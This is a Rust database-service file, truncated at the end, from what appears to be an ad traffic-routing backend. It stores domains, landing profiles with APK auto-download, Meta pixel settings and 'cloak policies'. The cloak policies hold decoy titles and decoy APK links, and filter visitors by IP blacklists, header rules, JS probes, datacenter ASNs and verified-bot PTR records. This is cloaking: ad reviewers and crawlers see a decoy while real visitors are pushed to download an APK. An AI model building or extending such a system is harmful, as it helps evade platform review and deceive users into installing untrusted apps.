use ab_db::DbPool;
use chrono::{DateTime, Utc};
use serde::{Deserialize, Serialize};
use uuid::Uuid;

use crate::meta::encrypt_meta_token;

#[derive(Debug, Clone, Serialize, sqlx::FromRow)]
pub struct DomainResource {
    pub id: Uuid,
    pub domain: String,
    pub role: String,
    pub note: String,
    pub enabled: bool,
    pub used_by_route: Option<String>,
    pub updated_at: DateTime<Utc>,
}

#[derive(Debug, Clone, Serialize, sqlx::FromRow)]
pub struct LandingProfile {
    pub id: Uuid,
    pub name: String,
    pub landing_mode: String,
    pub template_id: Option<Uuid>,
    pub template_name: Option<String>,
    pub image_asset_id: Option<Uuid>,
    pub image_name: Option<String>,
    pub title: String,
    pub apk_url: String,
    pub auto_download: bool,
    pub enabled: bool,
    pub updated_at: DateTime<Utc>,
}

#[derive(Debug, Clone, Serialize, sqlx::FromRow)]
pub struct CloakPolicy {
    pub id: Uuid,
    pub name: String,
    pub enabled: bool,
    pub threshold: i32,
    pub token_hours: i32,
    pub decoy_title: String,
    pub decoy_image_asset_id: Option<Uuid>,
    pub decoy_image_name: Option<String>,
    pub decoy_apk_url: String,
    pub use_ip_blacklist: bool,
    pub use_header_rules: bool,
    pub require_sec_fetch_mode: bool,
    pub use_js_probe: bool,
    pub use_asn: bool,
    pub use_ptr: bool,
    pub block_datacenter_asn: bool,
    pub block_datacenter_ptr: bool,
    pub block_verified_bot_ptr: bool,
    pub ptr_timeout_ms: i32,
    pub ptr_cache_hours: i32,
    pub bound_route_count: i64,
    pub bound_route_names: String,
    pub updated_at: DateTime<Utc>,
}

#[derive(Debug, Clone, Serialize, sqlx::FromRow)]
pub struct MetaProfile {
    pub id: Uuid,
    pub name: String,
    pub enabled: bool,
    pub pixel_id: String,
    pub capi_token_set: bool,
    pub test_event_code: String,
    pub currency: String,
    pub value: rust_decimal::Decimal,
    pub page_view_enabled: bool,
    pub view_content_enabled: bool,
    pub lead_enabled: bool,
    pub bound_route_count: i64,
    pub bound_route_names: String,
    pub updated_at: DateTime<Utc>,
}

#[derive(Debug, Clone, Deserialize)]
pub struct SaveDomainInput {
    pub domain: String,
    pub role: String,
    pub note: String,
    pub enabled: bool,
}

#[derive(Debug, Clone, Deserialize)]
pub struct SaveLandingProfileInput {
    pub name: String,
    pub landing_mode: String,
    pub template_id: Option<Uuid>,
    pub image_asset_id: Option<Uuid>,
    pub title: String,
    pub apk_url: String,
    pub auto_download: bool,
    pub enabled: bool,
}

#[derive(Debug, Clone, Deserialize)]
pub struct SaveCloakPolicyInput {
    pub name: String,
    pub enabled: bool,
    pub threshold: i32,
    pub token_hours: i32,
    pub decoy_title: String,
    pub decoy_image_asset_id: Option<Uuid>,
    pub decoy_apk_url: String,
    pub use_ip_blacklist: bool,
    pub use_header_rules: bool,
    pub require_sec_fetch_mode: bool,
    pub use_js_probe: bool,
    pub use_asn: bool,
    pub use_ptr: bool,
    pub block_datacenter_asn: bool,
    pub block_datacenter_ptr: bool,
    pub block_verified_bot_ptr: bool,
    pub ptr_timeout_ms: i32,
    pub ptr_cache_hours: i32,
}

#[derive(Debug, Clone, Deserialize)]
pub struct SaveMetaProfileInput {
    pub name: String,
    pub enabled: bool,
    pub pixel_id: String,
    pub capi_token: String,
    pub test_event_code: String,
    pub currency: String,
    pub value: rust_decimal::Decimal,
    pub page_view_enabled: bool,
    pub view_content_enabled: bool,
    pub lead_enabled: bool,
}

#[derive(Clone)]
pub struct ResourcesService {
    pool: DbPool,
    meta_token_key: String,
}

impl ResourcesService {
    pub fn new(pool: DbPool, meta_token_key: impl Into<String>) -> Self {
        Self {
            pool,
            meta_token_key: meta_token_key.into(),
        }
    }

    pub async fn list_domains(&self, role: Option<&str>) -> anyhow::Result<Vec<DomainResource>> {
        let role = match role {
            Some(role) if !role.trim().is_empty() => clean_role(role),
            _ => String::new(),
        };
        let rows = sqlx::query_as::<_, DomainResource>(
            r#"
            SELECT
              d.id,
              d.domain,
              d.role,
              d.note,
              d.enabled,
              COALESCE(
                NULLIF(r.name, ''),
                r.entry_domain,
                NULLIF(rt.name, ''),
                rt.entry_domain
              ) AS used_by_route,
              d.updated_at
            FROM domains d
            LEFT JOIN routes r ON r.entry_domain = d.domain
            LEFT JOIN route_targets t ON t.exit_domain_id = d.id OR t.exit_domain = d.domain
            LEFT JOIN routes rt ON rt.id = t.route_id
            WHERE ($1 = '' OR d.role = $1)
            ORDER BY d.role ASC, d.updated_at DESC, d.domain ASC
            "#,
        )
        .bind(role)
        .fetch_all(&self.pool)
        .await?;
        Ok(rows)
    }

    pub async fn list_exit_domains(&self) -> anyhow::Result<Vec<DomainResource>> {
        self.list_selectable_exit_domains(None).await
    }

    pub async fn list_selectable_entry_domains(
        &self,
        current_domain: Option<&str>,
    ) -> anyhow::Result<Vec<DomainResource>> {
        let current_domain = current_domain.map(clean_domain).unwrap_or_default();
        let rows = self
            .list_domains(Some("entry"))
            .await?
            .into_iter()
            .filter(|domain| domain.enabled || clean_domain(&domain.domain) == current_domain)
            .collect();
        Ok(rows)
    }

    pub async fn list_selectable_exit_domains(
        &self,
        current_id: Option<Uuid>,
    ) -> anyhow::Result<Vec<DomainResource>> {
        let rows = self
            .list_domains(Some("exit"))
            .await?
            .into_iter()
            .filter(|domain| domain.enabled || Some(domain.id) == current_id)
            .collect();
        Ok(rows)
    }

    pub async fn upsert_domain(&self, input: SaveDomainInput) -> anyhow::Result<()> {
        let domain = clean_domain(&input.domain);
        if domain.is_empty() {
            anyhow::bail!("域名不能为空");
        }
        let role = clean_role(&input.role);
        if let Some(id) =
            sqlx::query_scalar::<_, Uuid>("SELECT id FROM domains WHERE domain = $1 LIMIT 1")
                .bind(&domain)
                .fetch_optional(&self.pool)
                .await?
        {
            return self.update_domain(id, input).await;
        }
        validate_domain_resource_role(&self.pool, &domain, &role).await?;
        let mut tx = self.pool.begin().await?;
        sqlx::query(
            r#"
            INSERT INTO domains (domain, role, note, enabled)
            VALUES ($1, $2, $3, $4)
            ON CONFLICT (domain) DO UPDATE SET
              role = EXCLUDED.role,
              note = EXCLUDED.note,
              enabled = EXCLUDED.enabled,
              updated_at = now()
            "#,
        )
        .bind(&domain)
        .bind(role)
        .bind(input.note.trim())
        .bind(input.enabled)
        .execute(&mut *tx)
        .await?;
        sqlx::query(
            r#"
            INSERT INTO domain_allowlist (domain, source, enabled)
            VALUES ($1, 'resource', $2)
            ON CONFLICT (domain) DO UPDATE SET enabled = EXCLUDED.enabled, source = EXCLUDED.source
            "#,
        )
        .bind(&domain)
        .bind(input.enabled)
        .execute(&mut *tx)
        .await?;
        tx.commit().await?;
        Ok(())
    }

    pub async fn update_domain(&self, id: Uuid, input: SaveDomainInput) -> anyhow::Result<()> {
        let domain = clean_domain(&input.domain);
        if domain.is_empty() {
            anyhow::bail!("域名不能为空");
        }
        let role = clean_role(&input.role);
        let current = sqlx::query_as::<_, (String, String)>(
            "SELECT domain, role FROM domains WHERE id = $1 LIMIT 1",
        )
        .bind(id)
        .fetch_optional(&self.pool)
        .await?
        .ok_or_else(|| anyhow::anyhow!("域名不存在"))?;
        let duplicate = sqlx::query_scalar::<_, bool>(
            "SELECT EXISTS(SELECT 1 FROM domains WHERE domain = $1 AND id <> $2)",
        )
        .bind(&domain)
        .bind(id)
        .fetch_one(&self.pool)
        .await?;
        if duplicate {
            anyhow::bail!("域名已存在");
        }
        let used = domain_is_used(&self.pool, id).await?;
        if current.1 != role && used {
            anyhow::bail!("域名正在被线路引用，不能切换入口/出口类型");
        }
        if !input.enabled && used {
            anyhow::bail!("域名正在被线路引用，先在线路里移除后再停用");
        }
        if used && current.0 != domain {
            validate_domain_rename_target(&self.pool, &domain, &role).await?;
        }
        validate_domain_resource_role(&self.pool, &domain, &role).await?;

        let mut tx = self.pool.begin().await?;
        sqlx::query(
            r#"
            UPDATE domains
            SET domain = $1, role = $2, note = $3, enabled = $4, updated_at = now()
            WHERE id = $5
            "#,
        )
        .bind(&domain)
        .bind(&role)
        .bind(input.note.trim())
        .bind(input.enabled)
        .bind(id)
        .execute(&mut *tx)
        .await?;

        if role == "entry" {
            sqlx::query(
                "UPDATE routes SET entry_domain = $1, updated_at = now() WHERE entry_domain = $2",
            )
            .bind(&domain)
            .bind(&current.0)
            .execute(&mut *tx)
            .await?;
        } else {
            sqlx::query(
                "UPDATE route_targets SET exit_domain = $1 WHERE exit_domain_id = $2 OR exit_domain = $3",
            )
                .bind(&domain)
                .bind(id)
                .bind(&current.0)
                .execute(&mut *tx)
                .await?;
        }
        sqlx::query(
            r#"
            INSERT INTO domain_allowlist (domain, source, enabled)
            VALUES ($1, 'resource', $2)
            ON CONFLICT (domain) DO UPDATE SET enabled = EXCLUDED.enabled, source = EXCLUDED.source
            "#,
        )
        .bind(&domain)
        .bind(input.enabled)
        .execute(&mut *tx)
        .await?;
        if current.0 != domain {
            sqlx::query("UPDATE domain_allowlist SET enabled = FALSE WHERE domain = $1")
                .bind(&current.0)
                .execute(&mut *tx)
                .await?;
        }
        tx.commit().await?;
        Ok(())
    }

    pub async fn toggle_domain(&self, id: Uuid) -> anyhow::Result<()> {
        let current_enabled =
            sqlx::query_scalar::<_, bool>("SELECT enabled FROM domains WHERE id = $1 LIMIT 1")
                .bind(id)
                .fetch_optional(&self.pool)
                .await?
                .ok_or_else(|| anyhow::anyhow!("域名不存在"))?;
        if current_enabled && domain_is_used(&self.pool, id).await? {
            anyhow::bail!("域名正在被线路引用，先在线路里移除后再停用");
        }
        let domain = sqlx::query_scalar::<_, String>(
            r#"
            UPDATE domains
            SET enabled = NOT enabled, updated_at = now()
            WHERE id = $1
            RETURNING domain
            "#,
        )
        .bind(id)
        .fetch_optional(&self.pool)
        .await?
        .ok_or_else(|| anyhow::anyhow!("域名不存在"))?;
        sqlx::query(
            "UPDATE domain_allowlist SET enabled = (SELECT enabled FROM domains WHERE id = $1) WHERE domain = $2",
        )
        .bind(id)
        .bind(domain)
        .execute(&self.pool)
        .await?;
        Ok(())
    }

    pub async fn delete_domain(&self, id: Uuid) -> anyhow::Result<()> {
        let domain =
            sqlx::query_scalar::<_, String>("SELECT domain FROM domains WHERE id = $1 LIMIT 1")
                .bind(id)
                .fetch_optional(&self.pool)
                .await?
                .ok_or_else(|| anyhow::anyhow!("域名不存在"))?;
        if domain_is_used(&self.pool, id).await? {
            anyhow::bail!("域名正在被线路引用，先在线路里移除后再删除");
        }
        let mut tx = self.pool.begin().await?;
        sqlx::query("DELETE FROM domains WHERE id = $1")
            .bind(id)
            .execute(&mut *tx)
            .await?;
        sqlx::query("UPDATE domain_allowlist SET enabled = FALSE WHERE domain = $1")
            .bind(domain)
            .execute(&mut *tx)
            .await?;
        tx.commit().await?;
        Ok(())
    }

    pub async fn list_landing_profiles(&self) -> anyhow::Result<Vec<LandingProfile>> {
        let rows = sqlx::query_as::<_, LandingProfile>(
            r#"
            SELECT
              p.id,
              p.name,
              p.landing_mode,
              p.template_id,
              t.name AS template_name,
              p.image_asset_id,
              a.original_name AS image_name,
              p.title,
              p.apk_url,
              p.auto_download,
              p.enabled,
              p.updated_at
            FROM landing_profiles p
            LEFT JOIN landing_templates t ON t.id = p.template_id
            LEFT JOIN assets a ON a.id = p.image_asset_id
            ORDER BY p.updated_at DESC, p.created_at DESC
            "#,
        )
        .fetch_all(&self.pool)
        .await?;
        Ok(rows)
    }

    pub async fn list_enabled_landing_profiles(&self) -> anyhow::Result<Vec<LandingProfile>> {
        self.list_selectable_landing_profiles(None).await
    }

    pub async fn list_selectable_landing_profiles(
        &self,
        current_id: Option<Uuid>,
    ) -> anyhow::Result<Vec<LandingProfile>> {
        let rows = self
            .list_landing_profiles()
            .await?
            .into_iter()
            .filter(|profile| profile.enabled || Some(profile.id) == current_id)
            .collect();
        Ok(rows)
    }

    pub async fn save_landing_profile(
        &self,
        id: Option<Uuid>,
        input: SaveLandingProfileInput,
    ) -> anyhow::Result<Uuid> {
        let input = normalize_landing_profile(input)?;
        let id = match id {
            Some(id) => {
                if !input.enabled && landing_profile_is_used(&self.pool, id).await? {
                    anyhow::bail!("落地页正在被线路引用，先在线路里切换后再停用");
                }
                let mut tx = self.pool.begin().await?;
                let updated = sqlx::query(
                    r#"
                    UPDATE landing_profiles
                    SET name = $1,
                        landing_mode = $2,
                        template_id = $3,
                        image_asset_id = $4,
                        title = $5,
                        apk_url = $6,
                        auto_download = $7,
                        enabled = $8,
                        updated_at = now()
                    WHERE id = $9
                    "#,
                )
                .bind(&input.name)
                .bind(&input.landing_mode)
                .bind(input.template_id)
                .bind(input.image_asset_id)
                .bind(&input.title)
                .bind(&input.apk_url)
                .bind(input.auto_download)
                .bind(input.enabled)
                .bind(id)
                .execute(&mut *tx)
                .await?;
                if updated.rows_affected() == 0 {
                    anyhow::bail!("落地页不存在");
                }
                sqlx::query(
                    r#"
                    UPDATE route_landing_configs
                    SET landing_mode = $1,
                        template_id = $2,
                        image_asset_id = $3,
                        title = $4,
                        apk_url = $5,
                        auto_download = $6
                    WHERE landing_profile_id = $7
                    "#,
                )
                .bind(&input.landing_mode)
                .bind(input.template_id)
                .bind(input.image_asset_id)
                .bind(&input.title)
                .bind(&input.apk_url)
                .bind(input.auto_download)
                .bind(id)
                .execute(&mut *tx)
                .await?;
                tx.commit().await?;
                id
            }
            None => {
                sqlx::query_scalar::<_, Uuid>(
                    r#"
                    INSERT INTO landing_profiles (
                      name, landing_mode, template_id, image_asset_id, title, apk_url,
                      auto_download, enabled
                    )
                    VALUES ($1, $2, $3, $4, $5, $6, $7, $8)
                    RETURNING id
                    "#,
                )
                .bind(&input.name)
                .bind(&input.landing_mode)
                .bind(input.template_id)
                .bind(input.image_asset_id)
                .bind(&input.title)
                .bind(&input.apk_url)
                .bind(input.auto_download)
                .bind(input.enabled)
                .fetch_one(&self.pool)
                .await?
            }
        };
        Ok(id)
    }

    pub async fn toggle_landing_profile(&self, id: Uuid) -> anyhow::Result<()> {
        let current_enabled = sqlx::query_scalar::<_, bool>(
            "SELECT enabled FROM landing_profiles WHERE id = $1 LIMIT 1",
        )
        .bind(id)
        .fetch_optional(&self.pool)
        .await?
        .ok_or_else(|| anyhow::anyhow!("落地页不存在"))?;
        if current_enabled && landing_profile_is_used(&self.pool, id).await? {
            anyhow::bail!("落地页正在被线路引用，先在线路里切换后再停用");
        }
        sqlx::query(
            "UPDATE landing_profiles SET enabled = NOT enabled, updated_at = now() WHERE id = $1",
        )
        .bind(id)
        .execute(&self.pool)
        .await?;
        Ok(())
    }

    pub async fn delete_landing_profile(&self, id: Uuid) -> anyhow::Result<()> {
        let refs = sqlx::query_scalar::<_, i64>(
            "SELECT COUNT(*)::BIGINT FROM route_landing_configs WHERE landing_profile_id = $1",
        )
        .bind(id)
        .fetch_one(&self.pool)
        .await?;
        if refs > 0 {
            anyhow::bail!("落地页正在被线路引用，先在线路里切换后再删除");
        }
        let deleted = sqlx::query("DELETE FROM landing_profiles WHERE id = $1")
            .bind(id)
            .execute(&self.pool)
            .await?;
        if deleted.rows_affected() == 0 {
            anyhow::bail!("落地页不存在");
        }
        Ok(())
    }

    pub async fn list_cloak_policies(&self) -> anyhow::Result<Vec<CloakPolicy>> {
        let rows = sqlx::query_as::<_, CloakPolicy>(
            r#"
            SELECT
              p.id,
              p.name,
              p.enabled,
              p.threshold,
              p.token_hours,
              p.decoy_title,
              p.decoy_image_asset_id,
              a.original_name AS decoy_image_name,
              p.decoy_apk_url,
              p.use_ip_blacklist,
              p.use_header_rules,
              p.require_sec_fetch_mode,
              p.use_js_probe,
              p.use_asn,
              p.use_ptr,
              p.block_datacenter_asn,
              p.block_datacenter_ptr,
              p.block_verified_bot_ptr,
              p.ptr_timeout_ms,
              p.ptr_cache_hours,
              COALESCE(b.bound_route_count, 0) AS bound_route_count,
              COALESCE(b.bound_route_names, '') AS bound_route_names,
              p.updated_at
            FROM cloak_policies p
            LEFT JOIN assets a ON a.id = p.decoy_image_asset_id
            LEFT JOIN (
              SELECT
                c.cloak_policy_id,
                COUNT(*)::BIGINT AS bound_route_count,
                STRING_AGG(COALESCE(NULLIF(r.name, ''), r.entry_domain), '、' ORDER BY r.updated_at DESC) AS bound_route_names
              FROM route_cloak_configs c
              JOIN routes r ON r.id = c.route_id
              WHERE c.cloak_policy_id IS NOT NULL
              GROUP BY c.cloak_policy_id
            ) b ON b.cloak_policy_id = p.id
            ORDER BY p.updated_at DESC, p.created_at DESC
            "#,
        )
        .fetch_all(&self.pool)
        .await?;
        Ok(rows)
    }

    pub async fn list_selectable_cloak_policies(
        &self,
        current_id: Option<Uuid>,
    ) -> anyhow::Result<Vec<CloakPolicy>> {
        let rows = self
            .list_cloak_policies()
            .await?
            .into_iter()
            .filter(|policy| policy.enabled || Some(policy.id) == current_id)
            .collect();
        Ok(rows)
    }

    pub async fn save_cloak_policy(
        &self,
        id: Option<Uuid>,
        input: SaveCloakPolicyInput,
    ) -> anyhow::Result<Uuid> {
        let input = normalize_cloak_policy(input)?;
        let id = match id {
            Some(id) => {
                let mut tx = self.pool.begin().await?;
                let updated = sqlx::query(
                    r#"
                    UPDATE cloak_policies
                    SET name = $1,
                        enabled = $2,
                        threshold = $3,
                        token_hours = $4,
                        decoy_title = $5,
                        decoy_image_asset_id = $6,
                        decoy_apk_url = $7,
                        use_ip_blacklist = $8,
                        use_header_rules = $9,
                        require_sec_fetch_mode = $10,
                        use_js_probe = $11,
                        use_asn = $12,
                        use_ptr = $13,
                        block_datacenter_asn = $14,
                        block_datacenter_ptr = $15,
                        block_verified_bot_ptr = $16,
                        ptr_timeout_ms = $17,
                        ptr_cache_hours = $18,
                        updated_at = now()
                    WHERE id = $19
                    "#,
                )
                .bind(&input.name)
                .bind(input.enabled)
                .bind(input.threshold)
                .bind(input.token_hours)
                .bind(&input.decoy_title)
                .bind(input.decoy_image_asset_id)
                .bind(&input.decoy_apk_url)
                .bind(input.use_ip_blacklist)
                .bind(input.use_header_rules)
                .bind(input.require_sec_fetch_mode)
                .bind(input.use_js_probe)
                .bind(input.use_asn)
                .bind(input.use_ptr)
                .bind(input.block_datacenter_asn)
                .bind(input.block_datacenter_ptr)
                .bind(input.block_verified_bot_ptr)
                .bind(input.ptr_timeout_ms)
                .bind(input.ptr_cache_hours)
                .bind(id)
                .execute(&mut *tx)
                .await?;
                if updated.rows_affected() == 0 {
                    anyhow::bail!("分流策略不存在");
                }
                sqlx::query(
                    r#"
                    UPDATE route_cloak_configs
                    SET enabled = $1,
                        threshold = $2,
                        token_hours = $3,
                        decoy_title = $4,
                        decoy_image_asset_id = $5,
                        decoy_apk_url = $6,
                        use_ip_blacklist = $7,
                        use_header_rules = $8,
                        require_sec_fetch_mode = $9,
                        use_js_probe = $10,
                        use_asn = $11,
                        use_ptr = $12,
                        block_datacenter_asn = $13,
                        block_datacenter_ptr = $14,
                        block_verified_bot_ptr = $15,
                        ptr_timeout_ms = $16,
                        ptr_cache_hours = $17
                    WHERE cloak_policy_id = $18
                    "#,
                )
                .bind(input.enabled)
                .bind(input.threshold)
                .bind(input.token_hours)
                .bind(&input.decoy_title)
                .bind(input.decoy_image_asset_id)
                .bind(&input.decoy_apk_url)
                .bind(input.use_ip_blacklist)
                .bind(input.use_header_rules)
                .bind(input.require_sec_fetch_mode)
                .bind(input.use_js_probe)
                .bind(input.use_asn)
                .bind(input.use_ptr)
                .bind(input.block_datacenter_asn)
                .bind(input.block_datacenter_ptr)
                .bind(input.block_verified_bot_ptr)
                .bind(input.ptr_timeout_ms)
                .bind(input.ptr_cache_hours)
                .bind(id)
                .execute(&mut *tx)
                .await?;
                tx.commit().await?;
                id
            }
            None => {
                sqlx::query_scalar::<_, Uuid>(
                    r#"
                    INSERT INTO cloak_policies (
                      name, enabled, threshold, token_hours, decoy_title,
                      decoy_image_asset_id, decoy_apk_url, use_ip_blacklist,
                      use_header_rules, require_sec_fetch_mode, use_js_probe,
                      use_asn, use_ptr, block_datacenter_asn, block_datacenter_ptr,
                      block_verified_bot_ptr, ptr_timeout_ms, ptr_cache_hours
                    )
                    VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11, $12, $13, $14, $15, $16, $17, $18)
                    RETURNING id
                    "#,
                )
                .bind(&input.name)
                .bind(input.enabled)
                .bind(input.threshold)
                .bind(input.token_hours)
                .bind(&input.decoy_title)
                .bind(input.decoy_image_asset_id)
                .bind(&input.decoy_apk_url)
                .bind(input.use_ip_blacklist)
                .bind(input.use_header_rules)
                .bind(input.require_sec_fetch_mode)
                .bind(input.use_js_probe)
                .bind(input.use_asn)
                .bind(input.use_ptr)
                .bind(input.block_datacenter_asn)
                .bind(input.block_datacenter_ptr)
                .bind(input.block_verified_bot_ptr)
                .bind(input.ptr_timeout_ms)
                .bind(input.ptr_cache_hours)
                .fetch_one(&self.pool)
                .await?
            }
        };
        Ok(id)
    }

    pub async fn toggle_cloak_policy(&self, id: Uuid) -> anyhow::Result<()> {
        let mut tx = self.pool.begin().await?;
        let updated = sqlx::query_scalar::<_, bool>(
            r#"
            UPDATE cloak_policies
            SET enabled = NOT enabled, updated_at = now()
            WHERE id = $1
            RETURNING enabled
            "#,
        )
        .bind(id)
        .fetch_optional(&mut *tx)
        .await?;
        let Some(enabled) = updated else {
            anyhow::bail!("分流策略不存在");
        };
        sqlx::query("UPDATE route_cloak_configs SET enabled = $1 WHERE cloak_policy_id = $2")
            .bind(enabled)
            .bind(id)
            .execute(&mut *tx)
            .await?;
        tx.commit().await?;
        Ok(())
    }

    pub async fn delete_cloak_policy(&self, id: Uuid) -> anyhow::Result<()> {
        let refs = sqlx::query_scalar::<_, i64>(
            "SELECT COUNT(*)::BIGINT FROM route_cloak_configs WHERE cloak_policy_id = $1",
        )
        .bind(id)
        .fetch_one(&self.pool)
        .await?;
        if refs > 0 {
            anyhow::bail!("分流策略正在被线路引用，先在线路里切换后再删除");
        }
        let deleted = sqlx::query("DELETE FROM cloak_policies WHERE id = $1")
            .bind(id)
            .execute(&self.pool)
            .await?;
        if deleted.rows_affected() == 0 {
            anyhow::bail!("分流策略不存在");
        }
        Ok(())
    }

    pub async fn list_meta_profiles(&self) -> anyhow::Result<Vec<MetaProfile>> {
        let rows = sqlx::query_as::<_, MetaProfile>(
            r#"
            SELECT
              p.id,
              p.name,
              p.enabled,
              p.pixel_id,
              COALESCE(NULLIF(p.capi_token, ''), '') <> '' AS capi_token_set,
              p.test_event_code,
              p.currency,
              p.value,
              p.page_view_enabled,
              p.view_content_enabled,
              p.lead_enabled,
              COALESCE(b.bound_route_count, 0) AS bound_route_count,
              COALESCE(b.bound_route_names, '') AS bound_route_names,
              p.updated_at
            FROM meta_profiles p
            LEFT JOIN (
              SELECT
                m.meta_profile_id,
                COUNT(*)::BIGINT AS bound_route_count,
                STRING_AGG(COALESCE(NULLIF(r.name, ''), r.entry_domain), '、' ORDER BY r.updated_at DESC) AS bound_route_names
              FROM route_meta_configs m
              JOIN routes r ON r.id = m.route_id
              WHERE m.meta_profile_id IS NOT NULL
              GROUP BY m.meta_profile_id
            ) b ON b.meta_profile_id = p.id
            ORDER BY p.updated_at DESC, p.created_at DESC
            "#,
        )
        .fetch_all(&self.pool)
        .await?;
        Ok(rows)
    }

    pub async fn list_selectable_meta_profiles(
        &self,
        current_id: Option<Uuid>,
    ) -> anyhow::Result<Vec<MetaProfile>> {
        let rows = self
            .list_meta_profiles()
            .await?
            .into_iter()
            .filter(|profile| profile.enabled || Some(profile.id) == current_id)
            .collect();
        Ok(rows)
    }

    pub async fn save_meta_profile(
        &self,
        id: Option<Uuid>,
        input: SaveMetaProfileInput,
    ) -> anyhow::Result<Uuid> {
        let input = normalize_meta_profile(input)?;
        let raw_capi_token = input.capi_token.trim();
        let capi_token = encrypt_meta_token(raw_capi_token, &self.meta_token_key)?;
        let id = match id {
            Some(id) => {
                let mut tx = self.pool.begin().await?;
                let updated = if raw_capi_token.is_empty() {
                    sqlx::query(
                        r#"
                        UPDATE meta_profiles
                        SET name = $1,
                            enabled = $2,
                            pixel_id = $3,
                            test_event_code = $4,
                            currency = $5,
                            value = $6,
                            page_view_enabled = $7,
                            view_content_enabled = $8,
                            lead_enabled = $9,
                            updated_at = now()
                        WHERE id = $10
                        "#,
                    )
                    .bind(&input.name)
                    .bind(input.enabled)
                    .bind(&input.pixel_id)
                    .bind(&input.test_event_code)
                    .bind(&input.currency)
                    .bind(input.value)
                    .bind(input.page_view_enabled)
                    .bind(input.view_content_enabled)
                    .bind(input.lead_enabled)
                    .bind(id)
                    .execute(&mut *tx)
                    .await?
                } else {
                    sqlx::query(
                        r#"
                        UPDATE meta_profiles
                        SET name = $1,
                            enabled = $2,
                            pixel_id = $3,
                            capi_token = $4,
                            test_event_code = $5,
                            currency = $6,
                            value = $7,
                            page_view_enabled = $8,
                            view_content_enabled = $9,
                            lead_enabled = $10,
                            updated_at = now()
                        WHERE id = $11
                        "#,
                    )
                    .bind(&input.name)
                    .bind(input.enabled)
                    .bind(&input.pixel_id)
                    .bind(&capi_token)
                    .bind(&input.test_event_code)
                    .bind(&input.currency)
                    .bind(input.value)
                    .bind(input.page_view_enabled)
                    .bind(input.view_content_enabled)
                    .bind(input.lead_enabled)
                    .bind(id)
                    .execute(&mut *tx)
                    .await?
                };
                if updated.rows_affected() == 0 {
                    anyhow::bail!("Meta 配置不存在");
                }
                sync_bound_meta_routes(&mut tx, id, raw_capi_token.is_empty()).await?;
                tx.commit().await?;
                id
            }
            None => {
                sqlx::query_scalar::<_, Uuid>(
                    r#"
                    INSERT INTO meta_profiles (
                      name, enabled, pixel_id, capi_token, test_event_code, currency, value,
                      page_view_enabled, view_content_enabled, lead_enabled
                    )
                    VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10)
                    RETURNING id
                    "#,
                )
                .bind(&input.name)
                .bind(input.enabled)
                .bind(&input.pixel_id)
                .bind(&capi_token)
                .bind(&input.test_event_code)
                .bind(&input.currency)
                .bind(input.value)
                .bind(input.page_view_enabled)
                .bind(input.view_content_enabled)
                .bind(input.lead_enabled)
                .fetch_one(&self.pool)
                .await?
            }
        };
        Ok(id)
    }

    pub async fn toggle_meta_profile(&self, id: Uuid) -> anyhow::Result<()> {
        let mut tx = self.pool.begin().await?;
        let updated = sqlx::query_scalar::<_, bool>(
            r#"
            UPDATE meta_profiles
            SET enabled = NOT enabled, updated_at = now()
            WHERE id = $1
            RETURNING enabled
            "#,
        )
        .bind(id)
        .fetch_optional(&mut *tx)
        .await?;
        let Some(enabled) = updated else {
            anyhow::bail!("Meta 配置不存在");
        };
        sqlx::query("UPDATE route_meta_configs SET enabled = $1 WHERE meta_profile_id = $2")
            .bind(enabled)
            .bind(id)
            .execute(&mut *tx)
            .await?;
        tx.commit().await?;
        Ok(())
    }

    pub async fn delete_meta_profile(&self, id: Uuid) -> anyhow::Result<()> {
        let refs = sqlx::query_scalar::<_, i64>(
            "SELECT COUNT(*)::BIGINT FROM route_meta_configs WHERE meta_profile_id = $1",
        )
        .bind(id)
        .fetch_one(&self.pool)
        .await?;
        if refs > 0 {
            anyhow::bail!("Meta 配置正在被线路引用，先在线路里切换后再删除");
        }
        let deleted = sqlx::query("DELETE FROM meta_profiles WHERE id = $1")
            .bind(id)
            .execute(&self.pool)
            .await?;
        if deleted.rows_affected() == 0 {
            anyhow::bail!("Meta 配置不存在");
        }
        Ok(())
    }
}

async fn domain_is_used(pool: &DbPool, id: Uuid) -> anyhow::Result<bool> {
    let used = sqlx::query_scalar::<_, bool>(
        r#"
        SELECT EXISTS (
          SELECT 1
          FROM domains d
          LEFT JOIN routes r ON r.entry_domain = d.domain
          LEFT JOIN route_targets t ON t.exit_domain_id = d.id OR t.exit_domain = d.domain
          WHERE d.id = $1 AND (r.id IS NOT NULL OR t.route_id IS NOT NULL)
        )
        "#,
    )
    .bind(id)
    .fetch_one(pool)
    .await?;
    Ok(used)
}

async fn validate_domain_rename_target(
    pool: &DbPool,
    domain: &str,
    role: &str,
) -> anyhow::Result<()> {
    if role == "entry" {
        let used_as_entry = sqlx::query_scalar::<_, bool>(
            "SELECT EXISTS(SELECT 1 FROM routes WHERE entry_domain = $1)",
        )
        .bind(domain)
        .fetch_one(pool)
        .await?;
        if used_as_entry {
            anyhow::bail!("域名已经被其他线路作为入口域名使用");
        }
    } else {
        let used_as_exit = sqlx::query_scalar::<_, bool>(
            r#"
            SELECT EXISTS (
              SELECT 1
              FROM route_targets
              WHERE target_type = 'internal'
                AND (
                  exit_domain = $1
                  OR exit_domain_id = (SELECT id FROM domains WHERE domain = $1 LIMIT 1)
                )
            )
            "#,
        )
        .bind(domain)
        .fetch_one(pool)
        .await?;
        if used_as_exit {
            anyhow::bail!("域名已经被其他线路作为出口域名使用");
        }
    }
    Ok(())
}

async fn validate_domain_resource_role(
    pool: &DbPool,
    domain: &str,
    role: &str,
) -> anyhow::Result<()> {
    if role == "entry" {
        let used_as_exit = sqlx::query_scalar::<_, bool>(
            r#"
            SELECT EXISTS (
              SELECT 1
              FROM route_targets
              WHERE target_type = 'internal'
                AND (
                  exit_domain = $1
                  OR exit_domain_id = (SELECT id FROM domains WHERE domain = $1 LIMIT 1)
                )
            )
            "#,
        )
        .bind(domain)
        .fetch_one(pool)
        .await?;
        if used_as_exit {
            anyhow::bail!("域名已经被线路作为出口域名使用，不能设为入口域名");
        }
    } else {
        let used_as_entry = sqlx::query_scalar::<_, bool>(
            r#"
            SELECT EXISTS (
              SELECT 1
              FROM routes
              WHERE entry_domain = $1
            )
            "#,
        )
        .bind(domain)
        .fetch_one(pool)
        .await?;
        if used_as_entry {
            anyhow::bail!("域名已经被线路作为入口域名使用，不能设为出口域名");
        }
    }
    Ok(())
}

async fn landing_profile_is_used(pool: &DbPool, id: Uuid) -> anyhow::Result<bool> {
    let used = sqlx::query_scalar::<_, bool>(
